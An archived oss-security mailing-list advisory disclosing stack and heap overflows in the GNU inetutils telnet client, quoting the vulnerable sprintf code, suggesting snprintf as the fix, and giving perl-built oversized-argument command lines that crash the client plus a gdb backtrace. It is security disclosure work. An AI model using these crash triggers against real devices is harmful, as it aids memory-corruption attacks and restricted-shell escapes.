X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4561" "Tuesday" "11" "December" "2018" "10:39:36" "-0800" "Hacker Fantastic" "hackerfantastic@googlemail.com" "<CAG-OieOVQkON9yTYJcKuKGfP5XK5zitz0nTr9+ci71mTZrz-+A@mail.gmail.com>" "124" "[oss-security] Multiple telnet.c overflows" "^Date:" nil nil "12" "2018121118:39:36" "[oss-security] Multiple telnet.c overflows" (number mark "        hackerfantas Dec 11  124/4561  " thread-indent "\"[oss-security] Multiple telnet.c overflows\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 7346 invoked by uid 550); 11 Dec 2018 18:54:30 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 26035 invoked from network); 11 Dec 2018 18:39:59 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=googlemail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=jUMXh15de0K7UzPEvRHhMa6Q1l4TU0KlHY5/aSShhFc=;
        b=O6tQA9vDsIKiG0PQvYgTJVx0NCDBht4LIakuNaRFt6OqlUSkSiLQXFeaf0GxRWAJcW
         gfjXG51TlBFeZ+o1BjY8yPdcpDnZKGS5TtEdSwH7rjcDFYNH31yvIQK/+mh/fGkMOazG
         BDWAXPzHbVvl1V4RLpveVESYFI036CABw+p7hnIfAZyagTmKSoC0J7dp6nCgKyr6HGRT
         QNdIdX85StQEKronew6dYXo6J3vwnbQIoRT1MZ4JkUxsiVih23GvXDyU5yOnCICkXEJ+
         AzfZ7amIvVUVIeO1g4MmfeTPUjcPZugXDL2r60dMILdSJedaE3w4Iz/XvBvthwtnk2jO
         thuQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=jUMXh15de0K7UzPEvRHhMa6Q1l4TU0KlHY5/aSShhFc=;
        b=KlZ9BvUiIzM//ac3t9NGTK5uO9wC/aeuwkJmP82gSK/N4UBRtgKUWELHrryBwP7TSd
         kibIHDN/tW1mt7ckFVm8fFU5s7mppdcDjzkZjFyZ8N9Lj0KW//GDJMH8J1EiKvjWEYE8
         wfIwc1YkFFXslRVtA58ad3Nxk/498LsHJeePQR1xxNf51tFJEbaXkwOI/lIkcG9U3ktI
         /hnoKX6PgyolskgSz3N79ymmoDadKxY8GOzPWVBzcr2CivBmxHs4uTB7joZaXO4cmFw6
         wnvkNS3aS9d5ibB1/KemQs9B46MU8VcmxKRmWqp+1sObBWmpa6Fgzze9YDOkaZBxuGQw
         OJtA==
X-Gm-Message-State: AA+aEWbQkXiOc75qWrS4/R+TFT3Q9Sc0KDtLSUTu9fKqUS0c9ViZznlO
	ETO0DP8Js9wTxOYVtYERYAbLVIyG3++cge3TAyBOzmRJ
X-Google-Smtp-Source: AFSGD/VDULAu7n1CmvoA+vD7SVSx8rho9wBpwFE05lTwEm55pdKr3QmM6NN3IL+Uw3jxd1bAMvSVIyTh1pAgtyMUl58=
X-Received: by 2002:a19:41c4:: with SMTP id o187mr10460782lfa.32.1544553587807;
 Tue, 11 Dec 2018 10:39:47 -0800 (PST)
MIME-Version: 1.0
Message-ID: <CAG-OieOVQkON9yTYJcKuKGfP5XK5zitz0nTr9+ci71mTZrz-+A@mail.gmail.com>
Content-Type: multipart/alternative; boundary="000000000000f019a1057cc36734"
Date: Tue, 11 Dec 2018 10:39:36 -0800
From: Hacker Fantastic <hackerfantastic@googlemail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Multiple telnet.c overflows
To: oss-security@lists.openwall.com

--000000000000f019a1057cc36734
Content-Type: text/plain; charset="UTF-8"

Original advisory is here -
https://hacker.house/releasez/expl0itz/inetutils-telnet.txt

GNU inetutils <= 1.9.4 telnet.c multiple overflows
==================================================
GNU inetutils is vulnerable to a stack overflow vulnerability in the
client-side environment
variable handling which can be exploited to escape restricted shells
on embedded devices.
Most modern browsers no longer support telnet:// handlers, but in
instances where URI
handlers are enabled to the inetutils telnet client this issue maybe
remotely triggerable.
A stack-based overflow is present in the handling of environment
variables when connecting
telnet.c to remote telnet servers through oversized DISPLAY arguments.

A heap-overflow is also present which can be triggered in a different
code path due to
supplying oversized environment variables during client connection code.

The stack-based overflow can be seen in the following code snippet
from the latest inetutils
release dated 2015.

inetutils-telnet/inetutils-1.9.4/telnet/telnet.c

983-    case TELOPT_XDISPLOC:
984-      if (my_want_state_is_wont (TELOPT_XDISPLOC))
985-	return;
986-      if (SB_EOF ())
987-	return;
988-      if (SB_GET () == TELQUAL_SEND)
989-	{
990-	  unsigned char temp[50], *dp;
991-	  int len;
992-
993-	  if ((dp = env_getvalue ("DISPLAY")) == NULL)
994-	    {
995-	      /*
996-	       * Something happened, we no longer have a DISPLAY
997-	       * variable.  So, turn off the option.
998-	       */
999-	      send_wont (TELOPT_XDISPLOC, 1);
1000-	      break;
1001-	    }
1002:	  sprintf ((char *) temp, "%c%c%c%c%s%c%c", IAC, SB, TELOPT_XDISPLOC,
1003-		   TELQUAL_IS, dp, IAC, SE);
1004-	  len = strlen ((char *) temp + 4) + 4;	/* temp[3] is 0 ... */
1005-
1006-	  if (len < NETROOM ())

When a telnet server requests environment options the sprintf on line 1002 will
not perform bounds checking and causes an overflow of stack buffer
temp[50] defined
at line 990. This issue can be trivially fixed using a patch to add
bounds checking
to sprintf such as with a call to snprintf();

An example of the heap overflow can be seen when handling large environment
variables within the telnet client, causing heap buffer memory corruption
when handling large environment variables supplied through examples USER or
DISPLAY. An example of triggering this issue on inetutils in Arch Linux can be
seen below:

DISPLAY=`perl -e 'print Ax"50000"'` telnet -l`perl -e 'print
"A"x5000'` 192.168.69.1
Trying 192.168.69.1...
Connected to 192.168.69.1.
Escape character is '^]'.
realloc(): invalid next size
Aborted (core dumped)

These issues are present anywhere that inetutils is used as a base for clients
such as in common embedded home routers or networking equipment. An attacker
can potentially exploit these vulnerabilities to gain arbitrary code execution
on platforms where telnet commands are available. An example debug trace of the
heap overflow can be found below:

(gdb) run -l`perl -e 'print "A"x5000'` 192.168.69.1
Starting program: /usr/bin/telnet -l`perl -e 'print "A"x5000'` 192.168.69.1
Trying 192.168.69.1...
Connected to 192.168.69.1.
Escape character is '^]'.
realloc(): invalid next size

Program received signal SIGABRT, Aborted.
0x00007ffff7d87d7f in raise () from /usr/lib/libc.so.6
(gdb) bt
#0  0x00007ffff7d87d7f in raise () from /usr/lib/libc.so.6
#1  0x00007ffff7d72672 in abort () from /usr/lib/libc.so.6
#2  0x00007ffff7dca878 in __libc_message () from /usr/lib/libc.so.6
#3  0x00007ffff7dd118a in malloc_printerr () from /usr/lib/libc.so.6
#4  0x00007ffff7dd52ac in _int_realloc () from /usr/lib/libc.so.6
#5  0x00007ffff7dd62df in realloc () from /usr/lib/libc.so.6
#6  0x000055555556029c in ?? ()
#7  0x0000555555560116 in ?? ()
#8  0x000055555556049f in ?? ()
#9  0x00005555555606b7 in ?? ()
#10 0x00005555555616de in ?? ()
#11 0x0000555555561b8d in ?? ()
#12 0x0000555555562122 in ?? ()
#13 0x000055555555c6f4 in ?? ()
#14 0x00005555555591e7 in ?? ()
#15 0x00007ffff7d74223 in __libc_start_main () from /usr/lib/libc.so.6
#16 0x00005555555592be in ?? ()

Due to the various devices embedding telnet from inetutils and distributions
such as Arch Linux using inetutils telnet, it is unclear the full impact and all
scenarios where this issue could be leveraged. An attacker may seek to exploit
these vulnerabilities to escape restricted shells.

-- Hacker Fantastic (11/12/2018)
https://hacker.house


-- 
Hacker Fantastic
https://hacker.house

--000000000000f019a1057cc36734--
